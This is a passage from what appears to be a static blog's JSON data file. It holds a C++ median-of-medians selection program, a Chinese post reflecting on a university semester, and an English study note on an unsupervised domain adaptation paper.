class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//  main.cpp</span></span><br><span class=\"line\"><span class=\"comment\">//  deterministic_select</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"comment\">//  Created on 16/10/27.</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*-----------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"> * Function   -   sort these 5 numbers and return</span></span><br><span class=\"line\"><span class=\"comment\"> *                the median</span></span><br><span class=\"line\"><span class=\"comment\"> * ==============================================</span></span><br><span class=\"line\"><span class=\"comment\"> * arr        -   the array need to be sorted</span></span><br><span class=\"line\"><span class=\"comment\"> * arr_size   -   the size</span></span><br><span class=\"line\"><span class=\"comment\"> * ==============================================</span></span><br><span class=\"line\"><span class=\"comment\"> * Return     -   the median</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">BubbleSort</span><span class=\"params\">(<span class=\"keyword\">int</span> *arr, <span class=\"keyword\">int</span> arr_size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *a =<span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[arr_size];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt; arr_size;++i) a[i] = arr[i];</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> flag;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;arr_size;++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        flag = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j = i;j&lt;arr_size;++j)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(a[i] &gt; a[j])</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> tmp = a[i];</span><br><span class=\"line\">                a[i] = a[j];</span><br><span class=\"line\">                a[j] = tmp;</span><br><span class=\"line\">                flag = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(! flag) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a[arr_size/<span class=\"number\">2</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*----------------------------------------------</span></span><br><span class=\"line\"><span class=\"comment\"> * Function   -   return the num-th number in</span></span><br><span class=\"line\"><span class=\"comment\"> *                this array running time O(n)</span></span><br><span class=\"line\"><span class=\"comment\"> * =============================================</span></span><br><span class=\"line\"><span class=\"comment\"> * arr        -   the input array</span></span><br><span class=\"line\"><span class=\"comment\"> * arr_size   -   the size of the input array</span></span><br><span class=\"line\"><span class=\"comment\"> * num        -   want to find the num-th number</span></span><br><span class=\"line\"><span class=\"comment\"> *                in this array</span></span><br><span class=\"line\"><span class=\"comment\"> * =============================================</span></span><br><span class=\"line\"><span class=\"comment\"> * Return     -   the num-th number</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">DS</span><span class=\"params\">(<span class=\"keyword\">int</span> * arr, <span class=\"keyword\">int</span> arr_size, <span class=\"keyword\">int</span> num)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr_size == <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> arr_num = arr_size / <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *split_median = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[arr_num + <span class=\"number\">1</span>];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;arr_num;++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        split_median[i] = BubbleSort(arr + i * <span class=\"number\">5</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(arr_size % <span class=\"number\">5</span> != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        split_median[arr_num] = BubbleSort(arr + arr_num*<span class=\"number\">5</span>, arr_size - arr_num*<span class=\"number\">5</span>);</span><br><span class=\"line\">        arr_num ++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> pivot,pivot_index;</span><br><span class=\"line\">    pivot = DS(split_median, arr_num, arr_num/<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">delete</span> [] split_median;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;arr_size;++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(pivot == arr[i]) pivot_index = i,<span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">int</span> left = <span class=\"number\">0</span>, right = arr_size<span class=\"number\">-1</span>;</span><br><span class=\"line\">    arr[pivot_index] = arr[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left &lt; right)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(left &lt; right &amp;&amp; arr[right] &gt;= pivot)</span><br><span class=\"line\">            right --;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(left &lt; right)</span><br><span class=\"line\">            arr[left ++] = arr[right];</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(left &lt; right &amp;&amp; arr[left] &lt; pivot)</span><br><span class=\"line\">            left ++;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(left &lt; right)</span><br><span class=\"line\">            arr[right --] = arr[left];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    arr[left] = pivot;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(left == (num<span class=\"number\">-1</span>)) <span class=\"keyword\">return</span> pivot;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((num<span class=\"number\">-1</span>) &lt; left) <span class=\"keyword\">return</span> DS(arr, left, num);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> DS(arr + left + <span class=\"number\">1</span>, arr_size - left - <span class=\"number\">1</span>, num - left - <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> Size = <span class=\"number\">23</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> *Array = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[Size];</span><br><span class=\"line\">    <span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"Please choose the n-th number, the max number is \"</span>&lt;&lt; Size&lt;&lt;<span class=\"string\">\" : \"</span>&lt;&lt;<span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> No;</span><br><span class=\"line\">    <span class=\"built_in\">cin</span> &gt;&gt; No;</span><br><span class=\"line\">    freopen(<span class=\"string\">\"input.txt\"</span>, <span class=\"string\">\"r\"</span>, <span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i&lt;Size;++i) <span class=\"built_in\">cin</span> &gt;&gt; Array[i];</span><br><span class=\"line\">    <span class=\"keyword\">int</span> ans = DS(Array, Size, No);</span><br><span class=\"line\">    <span class=\"built_in\">cout</span> &lt;&lt; ans &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"大三上","_content":"\n> “新年第一篇”\n\n\n## 前言\n\n自去年9月底开博，之后陆陆续续写了几篇，就被自己以各种理由搁下了，期间还想过要再写几篇有关算法的心得，也终究因为课程原因没有再动笔。一晃就到了过年，四个月时间弹指一挥，心中惊悸。\n\n---\n\n## 正文\n\n大三上以十多天的熬夜间或通宵而告终，回到家后大睡三天，在此不由感激起明哥的carry。\n\n时常想起大三开学的第一天，三个青年捧着奶茶坐在三餐，立了一堆flag，恍如昨日一般，只是现在发觉似乎一个都没有实现。酝酿了一学期的PAPER现在还是在酝酿，考了一次英语也不是很理想，还有那不见起色的GPA，眼看快要到了收割的季节，自己的田地还是一片荒芜。\n\n整个大三上前几周有空的时候就在背单词，过了第八周感觉每周的时间就耗费在了SE和CG的meeting上(盛老师的研究生也是闲的可以)，之后到考试周组团复习，再到考完试杀大作业，顺便参加了美赛，按部就班。要真客观的来说，大三上两个字可以概括：“滑水”。知识没学到多少，套路倒是见识了很多，尤其是同系某G同学接近期末时扑朔迷离的小动作，更是让我深深怀疑“我大概上的是假学校吧“。\n\n今天想起止哥开了博客一直忘了去看，就去踩了踩，读完我止哥那充满激情的大三上总结，方觉人生格局全在态度，毕竟人外有人，着实惭愧。\n\nAnyway，好好学英语 & 早发PAPER & 不要成为一个庸俗的人。\n\n","source":"_posts/2017-01-30-smy.markdown","raw":"---\nlayout:     post\ntitle:      \"大三上\"\ntags:\n    - 生活\n---\n\n> “新年第一篇”\n\n\n## 前言\n\n自去年9月底开博，之后陆陆续续写了几篇，就被自己以各种理由搁下了，期间还想过要再写几篇有关算法的心得，也终究因为课程原因没有再动笔。一晃就到了过年，四个月时间弹指一挥，心中惊悸。\n\n---\n\n## 正文\n\n大三上以十多天的熬夜间或通宵而告终，回到家后大睡三天，在此不由感激起明哥的carry。\n\n时常想起大三开学的第一天，三个青年捧着奶茶坐在三餐，立了一堆flag，恍如昨日一般，只是现在发觉似乎一个都没有实现。酝酿了一学期的PAPER现在还是在酝酿，考了一次英语也不是很理想，还有那不见起色的GPA，眼看快要到了收割的季节，自己的田地还是一片荒芜。\n\n整个大三上前几周有空的时候就在背单词，过了第八周感觉每周的时间就耗费在了SE和CG的meeting上(盛老师的研究生也是闲的可以)，之后到考试周组团复习，再到考完试杀大作业，顺便参加了美赛，按部就班。要真客观的来说，大三上两个字可以概括：“滑水”。知识没学到多少，套路倒是见识了很多，尤其是同系某G同学接近期末时扑朔迷离的小动作，更是让我深深怀疑“我大概上的是假学校吧“。\n\n今天想起止哥开了博客一直忘了去看，就去踩了踩，读完我止哥那充满激情的大三上总结，方觉人生格局全在态度，毕竟人外有人，着实惭愧。\n\nAnyway，好好学英语 & 早发PAPER & 不要成为一个庸俗的人。\n\n","slug":"smy","published":1,"date":"2017-01-29T16:00:00.000Z","updated":"2018-04-23T11:55:01.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizb2000brikempouypxr","content":"<blockquote>\n<p>“新年第一篇”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>自去年9月底开博，之后陆陆续续写了几篇，就被自己以各种理由搁下了，期间还想过要再写几篇有关算法的心得，也终究因为课程原因没有再动笔。一晃就到了过年，四个月时间弹指一挥，心中惊悸。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>大三上以十多天的熬夜间或通宵而告终，回到家后大睡三天，在此不由感激起明哥的carry。</p>\n<p>时常想起大三开学的第一天，三个青年捧着奶茶坐在三餐，立了一堆flag，恍如昨日一般，只是现在发觉似乎一个都没有实现。酝酿了一学期的PAPER现在还是在酝酿，考了一次英语也不是很理想，还有那不见起色的GPA，眼看快要到了收割的季节，自己的田地还是一片荒芜。</p>\n<p>整个大三上前几周有空的时候就在背单词，过了第八周感觉每周的时间就耗费在了SE和CG的meeting上(盛老师的研究生也是闲的可以)，之后到考试周组团复习，再到考完试杀大作业，顺便参加了美赛，按部就班。要真客观的来说，大三上两个字可以概括：“滑水”。知识没学到多少，套路倒是见识了很多，尤其是同系某G同学接近期末时扑朔迷离的小动作，更是让我深深怀疑“我大概上的是假学校吧“。</p>\n<p>今天想起止哥开了博客一直忘了去看，就去踩了踩，读完我止哥那充满激情的大三上总结，方觉人生格局全在态度，毕竟人外有人，着实惭愧。</p>\n<p>Anyway，好好学英语 &amp; 早发PAPER &amp; 不要成为一个庸俗的人。</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“新年第一篇”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>自去年9月底开博，之后陆陆续续写了几篇，就被自己以各种理由搁下了，期间还想过要再写几篇有关算法的心得，也终究因为课程原因没有再动笔。一晃就到了过年，四个月时间弹指一挥，心中惊悸。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>大三上以十多天的熬夜间或通宵而告终，回到家后大睡三天，在此不由感激起明哥的carry。</p>\n<p>时常想起大三开学的第一天，三个青年捧着奶茶坐在三餐，立了一堆flag，恍如昨日一般，只是现在发觉似乎一个都没有实现。酝酿了一学期的PAPER现在还是在酝酿，考了一次英语也不是很理想，还有那不见起色的GPA，眼看快要到了收割的季节，自己的田地还是一片荒芜。</p>\n<p>整个大三上前几周有空的时候就在背单词，过了第八周感觉每周的时间就耗费在了SE和CG的meeting上(盛老师的研究生也是闲的可以)，之后到考试周组团复习，再到考完试杀大作业，顺便参加了美赛，按部就班。要真客观的来说，大三上两个字可以概括：“滑水”。知识没学到多少，套路倒是见识了很多，尤其是同系某G同学接近期末时扑朔迷离的小动作，更是让我深深怀疑“我大概上的是假学校吧“。</p>\n<p>今天想起止哥开了博客一直忘了去看，就去踩了踩，读完我止哥那充满激情的大三上总结，方觉人生格局全在态度，毕竟人外有人，着实惭愧。</p>\n<p>Anyway，好好学英语 &amp; 早发PAPER &amp; 不要成为一个庸俗的人。</p>\n"},{"layout":"post","title":"Unsupervised Domain Adaptation by Backpropagation","_content":"\n> “It's a good habite to take notes”\n\n\n## 前言\n\nI spent two afternoon for comprehension of this paper. And you can find the paper in the following address if you are interested.\n\n[Unsupervised Domain Adaptation by Backpropagation.](http://jmlr.org/proceedings/papers/v37/ganin15.pdf)\n\n---\n\n## 正文\n\nSo, what is domain adaptation (域自适应)? In general, we can only feed the machine with limited labled data but we want to apply the classifier to other similar datasets (unabled). That means the source domain (源域) and the target domain (目标域) are **not identically distributed**, referring to the training set and test set in machine learning. Take a classical problem for example, recognizing junk mail. Classifier is trained on a certain user's mail data and we want to apply it to another user's e-mail, surely different from the former user, then domain adaptation is needed, or say transfer learning.\n\n\n### Domain invariant feature \n\nHere comes the **domain invariant feature** (域不变特征). If we can learn some common features between source domain and target domain, the classifier learned from the source domain is also suitable to target domain. This article is using a conflict framework to learing domain invariant feature.\n\nThe assumption of learning domain invariant features is that, if the features on different domains can not be distinguished on a trained domain classifier, which means the loss of classification is large, then this feature can be regarded as invariant feature. \n\n### Model \n\nThe framework in this paper is as follow.\n\n![img](/images/in-post/post-blog-domainadp.png)\n\nThe framework consists of three parts, a deep feature extractor (green), a deep label predictor (blue) and a domain classifier (red). Feature extractor extract features, usually has convolutional layers and pooling layers. Label predictor is fully connected layers plus logistical classifier. Domain classifier is fully connected layers plus cross entropy classifier.\n\nOn one hand, in order to learn domain invariant feature, domain classification should not be carried out correctly, which means the loss of domain classifier should be maximized. On the other hand, we certainly require the classifier to be as accurate as possible, so the loss of domain classifier should be minimized.\n\nWe denote the vector of parameters of all layers in those three parts as $\\theta_f$, $\\theta_y$, $\\theta_d$.\n\nAt training time, seek $\\theta_f$ that ***maximize*** the loss of the <u>domain classifier</u>, seek $\\theta_d$ that ***minimize*** the loss of the <u>domain classifier</u>, seek $\\theta_y$ that minimize the loss of the <u>label predictor</u>.\n\nThen the parameters can be updated with backpropagation.\n\n![img](/images/in-post/post-blog-backpropfyd.png)\n\n$\\mu$ is the learning rate, and the factor $\\lambda$ is important according to author, otherwise the domain classifier loss will be minimized.\n\n","source":"_posts/2017-02-01-UDAbB.markdown","raw":"---\nlayout:     post\ntitle:      \"Unsupervised Domain Adaptation by Backpropagation\"\ntags:\n    - Notes\n---\n\n> “It's a good habite to take notes”\n\n\n## 前言\n\nI spent two afternoon for comprehension of this paper. And you can find the paper in the following address if you are interested.\n\n[Unsupervised Domain Adaptation by Backpropagation.](http://jmlr.org/proceedings/papers/v37/ganin15.pdf)\n\n---\n\n## 正文\n\nSo, what is domain adaptation (域自适应)? In general, we can only feed the machine with limited labled data but we want to apply the classifier to other similar datasets (unabled). That means the source domain (源域) and the target domain (目标域) are **not identically distributed**, referring to the training set and test set in machine learning. Take a classical problem for example, recognizing junk mail. Classifier is trained on a certain user's mail data and we want to apply it to another user's e-mail, surely different from the former user, then domain adaptation is needed, or say transfer learning.\n\n\n### Domain invariant feature \n\nHere comes the **domain invariant feature** (域不变特征). If we can learn some common features between source domain and target domain, the classifier learned from the source domain is also suitable to target domain. This article is using a conflict framework to learing domain invariant feature.\n\nThe assumption of learning domain invariant features is that, if the features on different domains can not be distinguished on a trained domain classifier, which means the loss of classification is large, then this feature can be regarded as invariant feature. \n\n### Model \n\nThe framework in this paper is as follow.\n\n![img](/images/in-post/post-blog-domainadp.png)\n\nThe framework consists of three parts, a deep feature extractor (green), a deep label predictor (blue) and a domain classifier (red). Feature extractor extract features, usually has convolutional layers and pooling layers. Label predictor is fully connected layers plus logistical classifier. Domain classifier is fully connected layers plus cross entropy classifier.\n\nOn one hand, in order to learn domain invariant feature, domain classification should not be carried out correctly, which means the loss of domain classifier should be maximized. On the other hand, we certainly require the classifier to be as accurate as possible, so the loss of domain classifier should be minimized.\n\nWe denote the vector of parameters of all layers in those three parts as $\\theta_f$, $\\theta_y$, $\\theta_d$.\n\nAt training time, seek $\\theta_f$ that ***maximize*** the loss of the <u>domain classifier</u>, seek $\\theta_d$ that ***minimize*** the loss of the <u>domain classifier</u>, seek $\\theta_y$ that minimize the loss of the <u>label predictor</u>.\n\nThen the parameters can be updated with backpropagation.\n\n![img](/images/in-post/post-blog-backpropfyd.png)\n\n$\\mu$ is the learning rate, and the factor $\\lambda$ is important according to author, otherwise the domain classifier loss will be minimized.\n\n","slug":"UDAbB","published":1,"date":"2017-01-31T16:00:00.000Z","updated":"2018-04-23T11:59:30.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizb5000erikev7qcly7j","content":"<blockquote>\n<p>“It’s a good habite to take notes”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>I spent two afternoon for comprehension of this paper. And you can find the paper in the following address if you are interested.</p>\n<p><a href=\"http://jmlr.org/proceedings/papers/v37/ganin15.pdf\" target=\"_blank\" rel=\"noopener\">Unsupervised Domain Adaptation by Backpropagation.</a></p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>So, what is domain adaptation (域自适应)? In general, we can only feed the machine with limited labled data but we want to apply the classifier to other similar datasets (unabled). That means the source domain (源域) and the target domain (目标域) are <strong>not identically distributed</strong>, referring to the training set and test set in machine learning. Take a classical problem for example, recognizing junk mail. Classifier is trained on a certain user’s mail data and we want to apply it to another user’s e-mail, surely different from the former user, then domain adaptation is needed, or say transfer learning.</p>\n<h3 id=\"Domain-invariant-feature\"><a href=\"#Domain-invariant-feature\" class=\"headerlink\" title=\"Domain invariant feature\"></a>Domain invariant feature</h3><p>Here comes the <strong>domain invariant feature</strong> (域不变特征). If we can learn some common features between source domain and target domain, the classifier learned from the source domain is also suitable to target domain. This article is using a conflict framework to learing domain invariant feature.</p>\n<p>The assumption of learning domain invariant features is that, if the features on different domains can not be distinguished on a trained domain classifier, which means the loss of classification is large, then this feature can be regarded as invariant feature. </p>\n<h3 id=\"Model\"><a href=\"#Model\" class=\"headerlink\" title=\"Model\"></a>Model</h3><p>The framework in this paper is as follow.</p>\n<p><img src=\"/images/in-post/post-blog-domainadp.png\" alt=\"img\"></p>\n<p>The framework consists of three parts, a deep feature extractor (green), a deep label predictor (blue) and a domain classifier (red). Feature extractor extract features, usually has convolutional layers and pooling layers. Label predictor is fully connected layers plus logistical classifier. Domain classifier is fully connected layers plus cross entropy classifier.</p>\n<p>On one hand, in order to learn domain invariant feature, domain classification should not be carried out correctly, which means the loss of domain classifier should be maximized. On the other hand, we certainly require the classifier to be as accurate as possible, so the loss of domain classifier should be minimized.</p>\n<p>We denote the vector of parameters of all layers in those three parts as $\\theta_f$, $\\theta_y$, $\\theta_d$.</p>\n<p>At training time, seek $\\theta_f$ that <strong><em>maximize</em></strong> the loss of the <u>domain classifier</u>, seek $\\theta_d$ that <strong><em>minimize</em></strong> the loss of the <u>domain classifier</u>, seek $\\theta_y$ that minimize the loss of the <u>label predictor</u>.</p>\n<p>Then the parameters can be updated with backpropagation.</p>\n<p><img src=\"/images/in-post/post-blog-backpropfyd.png\" alt=\"img\"></p>\n<p>$\\mu$ is the learning rate, and the factor $\\lambda$ is important according to author, otherwise the domain classifier loss will be minimized.</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“It’s a good habite to take notes”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>I spent two afternoon for comprehension of this paper. And you can find the paper in the following address if you are interested.</p>\n<p><a href=\"http://jmlr.org/proceedings/papers/v37/ganin15.pdf\" target=\"_blank\" rel=\"noopener\">Unsupervised Domain Adaptation by Backpropagation.</a></p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>So, what is domain adaptation (域自适应)? In general, we can only feed the machine with limited labled data but we want to apply the classifier to other similar datasets (unabled). That means the source domain (源域) and the target domain (目标域) are <strong>not identically distributed</strong>, referring to the training set and test set in machine learning. Take a classical problem for example, recognizing junk mail. Classifier is trained on a certain user’s mail data and we want to apply it to another user’s e-mail, surely different from the former user, then domain adaptation is needed, or say transfer learning.</p>\n<h3 id=\"Domain-invariant-feature\"><a href=\"#Domain-invariant-feature\" class=\"headerlink\" title=\"Domain invariant feature\"></a>Domain invariant feature</h3><p>Here comes the <strong>domain invariant feature</strong> (域不变特征). If we can learn some common features between source domain and target domain, the classifier learned from the source domain is also suitable to target domain. This article is using a conflict framework to learing domain invariant feature.</p>\n<p>The assumption of learning domain invariant features is that, if the features on different domains can not be distinguished on a trained domain classifier, which means the loss of classification is large, then this feature can be regarded as invariant feature. </p>\n<h3 id=\"Model\"><a href=\"#Model\" class=\"headerlink\" title=\"Model\"></a>Model</h3><p>The framework in this paper is as follow.</p>\n<p><img src=\"/images/in-post/post-blog-domainadp.png\" alt=\"img\"></p>\n<p>The framework consists of three parts, a deep feature extractor (green), a deep label predictor (blue) and a domain classifier (red). Feature extractor extract features, usually has convolutional layers and pooling layers. Label predictor is fully connected layers plus logistical classifier. Domain classifier is fully connected layers plus cross entropy classifier.</p>\n<p>On one hand, in order to learn domain invariant feature, domain classification should not be carried out correctly, which means the loss of domain classifier should be maximized. On the other hand, we certainly require the classifier to be as accurate as possible, so the loss of domain classifier should be minimized.</p>\n<p>We denote the vector of parameters of all layers in those three parts as $\\theta_f$, $\\theta_y$, $\\theta_d$.</p>\n<p>At training time, seek $\\theta_f$ that <strong><em>maximize</em></strong> the loss of the <u>domain classifier</u>, seek $\\theta_d$ that <strong><em>minimize</em></strong> the loss of the <u>domain classifier</u>, seek $\\theta_y$ that minimize the loss of the <u>label predictor</u>.</p>\n<p>Then the parameters can be updated with backpropagation.</p>\n<p><img src=\"/images/in-post/post-blog-backpropfyd.png\" alt=\"img\"></p>\n<p>$\\mu$ is the learning rate, and the factor $\\lambda$ is important according to author, otherwise the domain classifier loss will be minimized.</p>\n"},{"layout":"post","title":"狮城随笔","_content":"\n> “与世界握手言和，与自己重修旧好。”\n\n\n## 